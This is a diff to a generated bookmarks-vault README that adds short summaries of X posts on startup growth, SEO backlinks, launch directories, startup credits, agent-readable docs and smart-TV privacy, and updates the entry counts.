-<details><summary><b>Show 41 entries</b> — Founder content, growth/marketing tactics, product building, YC/startup programs, side projects, launch strategies</summary>
+<details><summary><b>Show 56 entries</b> — Founder content, growth/marketing tactics, product building, YC/startup programs, side projects, launch strategies</summary>
 
 - **[Technical writer pitch riding on a 'get your website cited by AI tools' article](https://x.com/Tech_girl/status/2105727717077405869)**  
   `Mari` · `2026-09-30` · `2 likes · 39.2K views · 11 bookmarks`
@@ -2048,18 +2210,99 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
   - **Takeaway:** A standard AI-SEO content loop with no proof yet; the launch's near-zero engagement is the more informative signal.
   - **Try it:** [blogr.ai](https://blogr.ai/) · [bytemailapp.com](https://bytemailapp.com/)
   - 🏷 seo, content-automation, blogr, email, indie
+- **[Six flat-fine legal traps for vibe-coded apps: COPPA, Google Fonts, CAN-SPAM and more](https://x.com/aakashgupta/status/2117745658040136129)** 🎬 ⭐  
+  `Aakash Gupta` · `2026-11-03` · `21 replies · 29 reposts · 284 likes · 756 bookmarks · 31.1K …`
+  - **Essence:** Aakash Gupta warns that a vibe-coded app can face a six-figure legal bill before the first sale. His list of flat per-violation risks: COPPA, Google Fonts, session replay, CAN-SPAM, auto-renewal rules and the 6 dollar DMCA copyright agent registration. The video is built to be sent to Claude with the request to fix everything. A self-reply lists the sources: FTC civil penalty notice and CAN-SPAM guide, 16 CFR 1.98, LG Muenchen I 3 O 17493/20, Cal. Penal Code 637.2, 17 USC 504(c) and 512(c), and 37 CFR 201.3. It says this is not legal advice. Replies add useful corrections: COPPA applies only if the app targets children or knows a user is under 13, CAN-SPAM has no private lawsuits, and the …
+  - **Takeaway:** A good pre-launch checklist, but the worst-case numbers are not typical. Self-host fonts, check COPPA scope, and read the replies' corrections.
+  - 🏷 compliance, coppa, gdpr, can-spam, vibe-coding, legal
+- **[Read a competitor's funnel and conversion values from their public GTM container](https://x.com/googlewaqas/status/2117613798370545971)**  
+  `Waqas | Ex-Google` · `2026-11-03` · `119 replies · 337 reposts · 5.7K likes · 15.9K bookmarks · …`
+  - **Essence:** An ex-Google ads specialist shows how to read a competitor's tracking from the public Google Tag Manager file. View the page source and search for GTM-, copy the ID, and open googletagmanager.com/gtm.js?id= with that ID. Search for AW- to see each Google Ads conversion, 'event' to see conversion names such as demo_booked or trial_started (their funnel in order), and 'value' to see what each step is worth to them. With a competitor's demo value you can decide whether you can outbid them on shared keywords. The thread ends with an agency pitch. Replies add that it only works if the container is not restricted, that server-side GTM hides it, that an old tool called GtmSpy did this, and that …
+  - **Takeaway:** A quick 10-minute recon trick for any competitor site. The post is also a lead-generation pitch, so treat the framing with care.
+  - 🏷 google-tag-manager, competitor-analysis, ads, growth
+- **[treg open-sources a Clay alternative for people search, claimed 85% cheaper](https://x.com/treg_ai/status/2117240513862738341)** 🎬  
+  `Treg` · `2026-11-02` · `88 replies · 126 reposts · 805 likes · 1.1K bookmarks · …`
+  - **Essence:** Treg announces an open-source 'Clay killer': 85% cheaper than Clay, the most accurate on a people-search benchmark, 25x faster, and runnable inside Claude Code or Codex for go-to-market work. A demo video and the try-it page (treg.to/people-search) come with it, and a self-reply links the repo superdesigndev/treg, described as OpenRouter for agent tools. Replies are friendly: people like having one key for many data tools and say it is easier than building another Clay table. One reply notes the product is powered by Jev. See the related treg entries.
+  - **Takeaway:** Worth a trial for lead lookups inside an agent. The speed and accuracy claims are the vendor's own.
+  - **Try it:** [treg.to/people-search](https://treg.to/people-search) · [github.com/superdesigndev/treg](https://github.com/superdesigndev/treg)
+  - 🏷 treg, people-search, gtm, clay-alternative, open-source
+- **[/REA-growth skill reverse-engineers a company's growth for about 58 cents](https://x.com/jasonzhou1993/status/2116122945605222637)** 🎬  
+  `Jason Zhou` · `2026-10-30` · `232 replies · 338 reposts · 3.9K likes · 8.4K bookmarks · …`
+  - **Essence:** Jason Zhou introduces /REA-growth, an open-source skill that reverse-engineers any company's growth: name a company and get a growth blueprint with every SEO, AEO, ads and social move on a timeline. A full teardown of Lovable costs 0.58 dollars. It runs on the treg platform (treg.to/rea-growth), made with a partner, and the repo is superdesigndev/treg. In replies, one user ran it on Cursor for 0.48 dollars and shared the report page, and others say it is a smart way to study competitor growth. One reply wonders whether consultants are doomed, and another doubts it is as good as claimed. See the earlier REA and treg entries.
+  - **Takeaway:** A cheap competitor-growth report generator. Spot-check one report you already know before trusting it.
+  - **Try it:** [treg.to/rea-growth](https://treg.to/rea-growth) · [github.com/superdesigndev/treg](https://github.com/superdesigndev/treg)
+  - 🏷 rea, growth, seo, aeo, treg
+- **[30 Claude skills packaged as a creative agency: strategist to media buyer](https://x.com/spect3ral/status/2115891187609448882)** 🎬  
+  `Ahad Shams | AI Ads Guy` · `2026-10-29` · `1.5K replies · 101 reposts · 911 likes · 2.7K bookmarks · …`
+  - **Essence:** Ahad Shams says he open-sourced a creative agency inside Claude: 30 skills in one folder. The roles are strategist (research, angles, briefs), copywriter (hooks, primary text, UGC scripts), designer (statics, carousels, variants), UGC director (creator briefs, shot lists, AI UGC), media buyer (setup, budgets, testing, scaling) and analyst (reports, fatigue, next tests). Each agent hands off to the next, from brief to hooks to ads to report, then the loop restarts. You can run it with your own team or pair it with HeyOz to turn briefs into finished ads. The analyst is the only agent allowed to say your favourite ad is dead. The download link did not appear in the captured text. Most of the …
+  - **Takeaway:** A useful role split for an ads workflow. You may need to reply to the post to get the folder.
+  - 🏷 claude-skills, ads, creative, ugc, agency
+- **[List of 50 'free' backlink sites; replies show many are paid or nofollow](https://x.com/wespreadjam/status/2115501442970857949)**  
+  `jam` · `2026-10-28` · `33 replies · 42 reposts · 580 likes · 1.5K bookmarks · …`
+  - **Essence:** jam posts a list of 50 sites for backlinks to rank on Google and AI search, including Crunchbase, StackShare, G2, F6S, SourceForge, AlternativeTo, Product Hunt, Capterra, Wellfound, Dev.to, Hashnode, GitHub, Hugging Face, Smithery, mcp.so and many AI-tool directories. A self-reply promotes the author's own service. Replies give the reality check: one user tested the list on a product, found 12 public links from 50 platforms and only 2 without nofollow. Others say some sites are not free and do not approve submissions easily. Replies add more sites such as Indie Hackers, BetaList, DevHunt and OpenAlternative.
+  - **Takeaway:** A starting list of directories. Expect low yield: many are paid, slow, or nofollow. See the SaaS directory playbook entry.
+  - 🏷 backlinks, seo, directories, launch
+- **[Free weekly SEO audit agent template; replies say the 'Fable 5.5' claim is a scam](https://x.com/cleeeeeeeeement/status/2115488774423773267)** 🎬  
+  `Clément` · `2026-10-28` · `309 replies · 20 reposts · 269 likes · 426 bookmarks · …`
+  - **Essence:** Clement says he built a system with 'Fable 5.5' that audits your website every week: it finds your real competitors, tracks the right keywords, builds a prioritized SEO plan, can do the work and tracks rankings. He says he gives it away if you reply 'SEO'. His replies drop one public link, rerun.build/templates/weekly-seo-action-plan, to every commenter. Many replies are just 'SEO'. Others say the model is not out and call it a scam, with one saying the poster 'has Fable 5.5 before Dario'. The template link is public, but the model claim is unverified. See the earlier free Opus 5.5 SEO assistant entry.
+  - **Takeaway:** The template link is open without replying. Ignore the Fable 5.5 claim and judge the plan on its own.
+  - **Try it:** [rerun.build/templates/weekly-seo-action-plan](https://rerun.build/templates/weekly-seo-action-plan)
+  - 🏷 seo, audit, agent-template, engagement-bait
+- **[150+ free calculator pages grew Google impressions from 780 to 66,000 a day](https://x.com/junead_kh/status/2115518966852399219)**  
+  `Junead Khan` · `2026-10-28` · `41 replies · 18 reposts · 279 likes · 478 bookmarks · 33.7K …`
+  - **Essence:** Junead built 150+ free calculator pages: a paycheck calculator, an income tax calculator and tax brackets for every US state (treasury.sh/tools). Daily Google impressions went from 780 to 66,000 in 6 weeks. The Search Console screenshot shows 5.28K clicks and 1.66M impressions over six months, 0.3% CTR and average position 7.5, with the jump starting in late September. In replies he checks indexing: 720 pages indexed and 58 'discovered, not indexed', 56 of them calculator pages. Conversions are small, because people searching 'paycheck calculator' want an answer, not an app. Adding a call to action at the bottom of each calculator started to bring signups. Replies advise watching indexed …
+  - **Takeaway:** Programmatic SEO with real utility pages works for traffic. Monetizing the visitors is the open problem.
+  - **Try it:** [treasury.sh/tools](https://treasury.sh/tools)
+  - 🏷 programmatic-seo, calculators, search-console, growth
+- **[Free startup credits list: AWS, Azure, Cloudflare, PostHog, Retool and more](https://x.com/vercinyc/status/2115081835151802568)**  
+  `Verci` · `2026-10-27` · `182 replies · 45 reposts · 841 likes · 1.5K bookmarks · 53K …`
+  - **Essence:** Verci lists credits you can claim now without VC money: AWS Activate up to 5K dollars, Microsoft for Startups up to 5K dollars in Azure (up to 150K with an investor referral), Cloudflare 10K if bootstrapped, PostHog 50K if under two years old, Retool free for a year up to 60K, Intercom 93% off the first year, Notion three months of Business with AI, Google Cloud 2K dollars to start, and NVIDIA Inception credits and GPU discounts. A doc with 25+ programs, including 200K+ ones, is sent by DM when you follow and reply 'credits'. Replies are mostly the word 'credits' plus a note that stacked credits buy months of runway. The amounts are as claimed on 27 Oct 2026, so confirm each program's terms.
+  - **Takeaway:** A good checklist of credit programs. Verify current terms before you plan runway around them.
+  - 🏷 startup-credits, aws-activate, cloud, bootstrapping
+- **[Get listed on the Notion Marketplace for a dofollow link (DR 90)](https://x.com/tarasshyn/status/2114368719488967038)**  
+  `Taras` · `2026-10-24` · `12 replies · 5 reposts · 87 likes · 182 bookmarks · 14.8K …`
+  - **Essence:** Taras explains how to list a SaaS in the Notion Marketplace for a dedicated page and a dofollow link. Step 1: build a simple use case that sends data from your SaaS into Notion, such as new leads or reports as rows in a database. Step 2: create a public connection in Notion's developer settings with the installation scope 'Any workspace', which cannot be changed later. Step 3: on the connection page, click Publish to Marketplace and fill in the name, description, category, logo and screenshots. Step 4: submit; Notion replies by email in 5 to 10 business days. The page goes live at notion.com/connections/your-name. Customers can also connect your SaaS to Notion in a few clicks. Replies: one …
+  - **Takeaway:** A concrete listing recipe. Check the scope setting before you publish, because it cannot be changed.
+  - 🏷 notion, marketplace, backlinks, saas, seo
+- **[One prompt makes a repo AI-readable: llms.txt plus a Markdown page for every route](https://x.com/kalashvasaniya/status/2114433628419879152)**  
+  `Kalash` · `2026-10-24` · `45 replies · 50 reposts · 881 likes · 2K bookmarks · 64.9K …`
+  - **Essence:** Kalash shares a prompt for a codebase: fetch scrolllaunch.com/prompts/ai-readable-site.md and carry out its prompt section on the repo, but show a plan before writing code. It is meant to handle SEO, AEO, GEO and ASO and to create a .md file for every page. He quotes govi's line that the future is full of markdown files. A self-reply links the prompt page, and another links directory submission at scrolllaunch.com. Replies mention dualmark.dev (AEO infrastructure for marketing sites). One sceptic says a markdown file per page does not make AI models recommend your site. Kalash agrees it is no guarantee, but says making content easier for AI to read does not hurt. He also suggests turning …
+  - **Takeaway:** A cheap experiment for AI discoverability. Expect better readability, not guaranteed recommendations.
+  - **Try it:** [scrolllaunch.com/prompts/ai-readable-site.md](https://scrolllaunch.com/prompts/ai-readable-site.md)
+  - 🏷 llms-txt, aeo, seo, markdown, prompt
+- **[Get docs scored on Fern's Agent Score for a public dofollow page (DR 77)](https://x.com/tarasshyn/status/2113979571884429494)**  
+  `Taras` · `2026-10-23` · `8 replies · 3 reposts · 106 likes · 240 bookmarks · 14.1K …`
+  - **Essence:** Taras explains Fern's Agent Score as a visibility hack. Step 1: host docs on your own domain. Step 2: make them readable for agents with an llms.txt that lists every page and a .md version of each page. Step 3: check locally with npx afdocs. Step 4: go to buildwithfern.com/agent-score, click Score docs and paste the URL. The page goes live at once with your grade and a dofollow link to your docs, and you can request a leaderboard listing. Replies: a company says its docs got an A+; one reply says llms.txt has nothing to do with agentic scoring; Taras says Fern's score is easier to trick and points to Vercel's is-agentic.com as a better measure. The quoted post is a similar hack for a …
+  - **Takeaway:** A quick way to test and publicize agent-readable docs. Treat the score as a signal, not proof.
+  - **Try it:** [is-agentic.com](https://is-agentic.com/)
+  - 🏷 docs, llms-txt, agent-readiness, seo
+- **[Backlink research prompt: 30 verified free opportunities and a 7-day plan](https://x.com/2whazzuup/status/2113470379713085739)**  
+  `Grant O` · `2026-10-23` · `9 replies · 15 reposts · 165 likes · 588 bookmarks · 25.9K …`
+  - **Essence:** Grant posts a reusable prompt. The model acts as an SEO link-building researcher; you fill in your website, niche, audience and country. It must find 30 legitimate free backlink opportunities in categories such as niche directories, industry resource pages, free listings, community and association directories and free tool directories. For each one it gives the site name, direct submission URL, relevance, whether it is free, how to get the link, approval needs and effort. Rules: verify each site exists and accepts submissions, exclude guest posts, paid placements and link farms, do not invent URLs, and return fewer if fewer qualify. It then ranks the results and writes a 7-day acquisition …
+  - **Takeaway:** A solid prompt skeleton with good anti-hallucination rules. Always verify every URL by hand.
+  - 🏷 backlinks, prompt, seo, directories
+- **[50 places to launch your startup: HN, Product Hunt, BetaList, Uneed and more](https://x.com/Miracle_NNnn/status/2113140729933422877)**  
+  `Miracle Nnamdi` · `2026-10-22` · `171 replies · 283 reposts · 2.4K likes · 6K bookmarks · …`
+  - **Essence:** Miracle lists 50 places to launch a startup. The top of the list: Hacker News, Reddit, Product Hunt, GeekNews (news.hada.io), whatlaunched.today, Indie Hackers, BetaList, Uneed, Peerlist and DevHunt. The rest are review sites (G2, Capterra, GetApp, TrustRadius), AI tool directories (Futurepedia, There's An AI For That, Toolify, FutureTools), and launch boards such as SideProjectors, Microlaunch, TinyLaunch and Wellfound. A self-reply sells directory submission for 100+ sites. In the thread he says the list is platforms where founders reported getting users, and results vary by product. Replies add trylaunch.ai and justhunt.co, and the top reply says the real step zero is customers.
+  - **Takeaway:** A broad launch checklist. Pick the few that match your audience instead of submitting everywhere.
+  - 🏷 launch, directories, product-hunt, indie-hackers
+- **[Publish a CLI to npm for automatic listings on Libraries.io and more (DR 75)](https://x.com/tarasshyn/status/2112893275933741142)**  
+  `Taras` · `2026-10-20` · `3 replies · 1 reposts · 82 likes · 177 bookmarks · 7.9K …`
+  - **Essence:** Taras says another visibility hack for a SaaS is to create a CLI, because npm directories such as Libraries.io (DR 75) pick it up automatically. Step 1: have a public API. Step 2: wrap it in a small CLI with a login command that takes an API key and one command per main action (ask Claude to write it). Step 3: fill in name, description, keywords, homepage and repository in package.json. Step 4: run npm publish --access public. It is then picked up by npm.io, Libraries.io, jsDelivr, Google's deps.dev and others, and some customers prefer a CLI to an API or MCP. Replies agree and add MCP servers as another listing route. In the replies, an Ahrefs account says it is releasing a preview of DR4 …
+  - **Takeaway:** A small CLI is cheap distribution. The DR scores quoted across the series may shift after Ahrefs rolls out DR4 on 1 Dec 2026.
+  - **Try it:** [libraries.io](https://libraries.io/)
+  - 🏷 cli, npm, backlinks, ahrefs, dr4
+- **[A list of 724 mostly free backlink opportunities](https://x.com/2whazzuup/status/2112291036315709828)**  
+  `Grant O` · `2026-10-19` · `8 replies · 34 reposts · 151 likes · 534 bookmarks · 35.6K …`
+  - **Essence:** Grant shares a list of 724 mostly free backlink opportunities and asks for a like or repost if it helps. The post has no body text; the content is a long list of sites. It covers general and AI-tool directories, startup and business listings, guest-post and write-for-us sites, tech and startup media, community and forum sites, and profile sites such as GitHub, GitLab, Dribbble, Behance and Stack Overflow. Eight replies were not captured as useful text. As with the other backlink lists, many entries will be paid, dead or nofollow.
+  - **Takeaway:** Raw material for a backlink sheet. Filter out dead and paid sites before you submit.
+  - 🏷 backlinks, directories, guest-posts, seo
 - **[I built ThreadLens: upload a chat export and see the patterns in any argument](https://www.linkedin.com/feed/update/urn:li:activity:7467073714950434816)**  
   `Vipul Bajaj` · `2026-06-01` · `♥44 · 4 comments`
   - **Essence:** Vipul tells the origin story of ThreadLens: a friend emerged from a fight absolutely sure she was right because she only had screenshots, so he had her drop a full chat export into what he'd been building — and seeing every message and gap, not just her selected ones, changed her view in twenty minutes. The product takes WhatsApp, Telegram or iMessage exports, runs entirely in the browser with no account, and shows who messages first, who waits longer, who apologizes more and who escalates, with an optional AI that only sees what you ask about; it's free. The four replies are light praise and a joke he leans into — 'every group chat has someone who remembers every message and someone who …
   - **Takeaway:** A sharp positioning lesson: sell the product as a neutral referee for arguments, with privacy (local-only, no signup) as the trust unlock for sensitive data.
   - **Try it:** [lnkd.in/gWE76tPa](https://lnkd.in/gWE76tPa)
   - 🏷 side-project, consumer-app, chat-analytics, privacy, product-launch
-- **[Udaan: mentor-driven startup launchpad for college students (BITS Pilani)](https://www.linkedin.com/feed/update/urn:li:activity:7037714038281093120)**  
-  `PIEDS : Pilani Innovation & …` · `2023-03-04` · `♥124 · 4 comments · 12 reposts`
-  - **Essence:** PIEDS at BITS Pilani opens applications for Udaan, a mentor-driven launchpad for early-stage student startups: a 2-day offline bootcamp plus 8 weeks of virtual mentorship for 30 startups, with the top 10 going to a June demo day to pitch investors across India. Registration closed 25 March 2023, and the post tags a long list of faculty, mentors and India Accelerator. Replies include genuine congratulations alongside off-topic commenters asking for DMs; 124 reactions and 12 reposts show it travelled within the student-entrepreneurship network.
-  - **Takeaway:** A structured student-startup program template (bootcamp → 8 weeks mentorship → investor demo day); the 2023 cycle is long closed, so it's a pattern to watch for rather than apply to.
-  - **Try it:** [lnkd.in/dFMgsFad](https://lnkd.in/dFMgsFad)
-  - 🏷 startup-program, student-startups, mentorship, bits-pilani, demo-day
 
 </details>
 
@@ -2256,9 +2499,9 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
 
 <a id="tech-industry-news"></a>
 
-## Tech Industry & News (4)
+## Tech Industry & News (5)
 
-<details><summary><b>Show 4 entries</b> — Company announcements, industry drama, big-tech news, product launches by majors, policy</summary>
+<details><summary><b>Show 5 entries</b> — Company announcements, industry drama, big-tech news, product launches by majors, policy</summary>
 
 - **[How Hotstar streams to 65M+ concurrent viewers over HLS](https://x.com/mehulmpt/status/2031803518630453287)**  
   `Mehul Mohan` · `2026-03-11` · `18 replies · 39 reposts · 820 likes · 65.8K views · 491 …`
@@ -2281,6 +2524,12 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
   - **Takeaway:** A useful data point on the coming agent-vs-commerce-platform access fight - and a reminder that 'persistent logged-in phone' workarounds carry account and ToS risk.
   - **Try it:** [maritime.sh](https://maritime.sh/)
   - 🏷 amazon, ai-agents, android-mcp, commerce, maritime
+- **[Smart TV privacy: turn off ACR, isolate IoT devices and filter DNS with NextDNS](https://x.com/Tristan0x/status/2114311011561812476)** ⭐  
+  `Tristan` · `2026-10-21` · `348 replies · 3.6K reposts · 22.6K likes · 28.6K bookmarks …`
+  - **Essence:** Tristan summarizes why smart TVs are cheap. A researcher (log4j) rooted a 2025 Samsung TV and found an always-on microphone, automatic content recognition (ACR), geolocation, network mapping and ad profiling shared with hundreds of partners. ACR screenshots the screen and sends fingerprints home: Samsung about every 500 ms, LG every 10 ms, and it can fingerprint HDMI inputs from laptops and consoles. Step 1: turn ACR off (Samsung: Terms and Privacy, Viewing Information Services; LG: Live Plus; Vizio: Viewing Data; Roku: Use info from TV inputs; Sony and Google TV: Samba Interactive TV), opt out of interest-based ads, reset the advertising ID and turn off voice. Step 2: put TVs, cameras …
+  - **Takeaway:** A practical home-network privacy checklist. The simplest fix is to keep the TV offline and use a separate streaming device.
+  - **Try it:** [nextdns.io](https://nextdns.io/) · [arxiv.org/abs/2409.06203](https://arxiv.org/abs/2409.06203)
+  - 🏷 privacy, smart-tv, acr, nextdns, iot
 
 </details>
 
@@ -2325,7 +2574,7 @@ bookmarks-vault/                  ← also an Obsidian vault (open this folder i
 ├── README.md                     ← you are here (generated)
 ├── Home.md                       ← Obsidian dashboard (generated)
 ├── Categories/*.md               ← 14 category index notes
-├── Entries/*.md                  ← 389 bookmark notes, one per entry (frontmatter + tags)
+├── Entries/*.md                  ← 431 bookmark notes, one per entry (frontmatter + tags)
 ├── Bookmarks_Categorized.xlsx    ← the full workbook: README + Master Index + a sheet per category
 ├── category_taxonomy.json        ← the fixed category list used for sorting
 ├── data/
@@ -2359,5 +2608,5 @@ python scripts/generate_obsidian.py    # rows → Home.md + Categories/ + Entrie
 ```
 
 _Extraction: Ego browser automation over X Bookmarks, Reddit Saved and LinkedIn Saved Posts._
-_Coverage: 344 X bookmarks (5 original tweets now deleted — flagged in their entries), all Reddit
+_Coverage: 387 X bookmarks (5 original tweets now deleted — flagged in their entries), all Reddit
 saved items, and all LinkedIn saved posts. Replies captured are the top ~15 per thread._
